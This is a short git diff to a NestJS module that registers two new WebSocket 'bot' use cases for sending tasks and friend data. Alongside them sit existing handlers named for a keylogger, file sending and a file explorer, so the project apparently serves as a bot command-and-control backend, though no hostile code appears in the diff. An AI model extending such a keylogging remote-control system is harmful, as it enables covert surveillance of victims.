@@ -15,6 +15,8 @@ import { WsBotSendExplorerUseCase } from "./application/events/ws-bot-send-explo
 import { WsBotKeyLoggerUseCase } from "./application/events/ws-bot-keylogger.use-case";
 import { SchemasModule } from "@/src/repository/schemas.module";
 import { WsClientModule } from "../ws-client/ws-client.module";
+import { WsBotSendTasksUseCase } from "./application/events/ws-bot-send-tasks.use-case";
+import { WsBotSendFriendUseCase } from "./application/events/ws-bot-send-friend.use-case";
 
 @Module({
   providers: [
@@ -30,6 +32,8 @@ import { WsClientModule } from "../ws-client/ws-client.module";
     WsBotSendFileUseCase,
     WsBotSendExplorerUseCase,
     WsBotKeyLoggerUseCase,
+    WsBotSendTasksUseCase,
+    WsBotSendFriendUseCase,
   ],
   exports: [
     WsBotSendMessageUseCase,
@@ -42,6 +46,8 @@ import { WsClientModule } from "../ws-client/ws-client.module";
     WsBotRepository,
     WsBotSendExplorerUseCase,
     WsBotKeyLoggerUseCase,
+    WsBotSendTasksUseCase,
+    WsBotSendFriendUseCase,
   ],
   imports: [
     forwardRef(() => AuthModule),
